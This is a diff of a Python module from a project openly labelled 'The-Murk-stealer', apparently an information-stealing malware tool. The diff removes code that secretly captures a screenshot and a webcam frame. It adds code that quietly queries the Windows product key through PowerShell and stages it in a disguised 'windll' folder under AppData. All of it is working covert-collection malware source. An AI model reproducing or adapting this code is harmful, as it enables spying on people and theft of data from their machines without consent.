@@ -9,27 +9,22 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
-from PIL import ImageGrab
-from os import environ,sep
-import cv2
+import subprocess
+import os
 
-def Screenshot():
-	try:
-		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
-		screen = ImageGrab.grab()
-		screen.save(rf'{pathtofolder}\windll\Photos\sreenshot.jpg')
-		print("screen")
-	except Exception as e:
-		print(e)
+def PKay():
+    pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\windll'
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    result = subprocess.run(
+        ['powershell', '-Command', '(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey'],
+        capture_output=True,
+        text=True,
+        startupinfo=startupinfo
+    )
 
-def WebCam(): 
-	try:
-		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
-		cap = cv2.VideoCapture(0)
-		for i in range(30):
-			cap.read()
-		ret, frame = cap.read()
-		cv2.imwrite(pathtofolder+'\\windll\\Photos\\webcam.png', frame)   
-		cap.release()
-	except:
-	    pass
+    output = result.stdout.strip()
+
+    if output:
+         with open(pathtofile+"\\System\\productkey.txt", 'w', encoding='UTF-8') as f:
+            f.write(output)
